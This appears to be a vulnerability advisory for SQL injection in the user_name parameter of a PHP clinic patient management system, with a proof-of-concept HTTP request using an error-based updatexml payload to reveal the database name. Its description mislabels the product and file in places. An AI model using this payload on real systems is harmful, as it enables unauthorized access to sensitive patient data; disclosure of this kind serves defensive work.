## Clinic's Patient Management System has SQL injection vulnerability

## supplier
https://www.sourcecodester.com/php-clinics-patient-management-system-source-code
## Vulnerability file
/pms/ajax/check_user_name.php
## describe
An unrestricted SQL injection attack exists in an inventory management system. The parameters that can be controlled are as follows: user_name. This function executes the user_name parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.
## code analysis
The user_name parameter in check_medicine_name.php is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection.

<img width="876" alt="image" src="https://github.com/user-attachments/assets/4ad173a1-37f9-4a81-a0a2-9e96b53d2d9d">

Injection via parameter user_name
POC
```
GET /pms/ajax/check_user_name.php?user_name=admin%27%20and(updatexml(1,concat(0x7e,(select+database())),1))--%201 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

Get the database name: pms_db

<img width="1253" alt="image" src="https://github.com/user-attachments/assets/7f2d8de1-803d-4198-8438-dfda34cfad60">









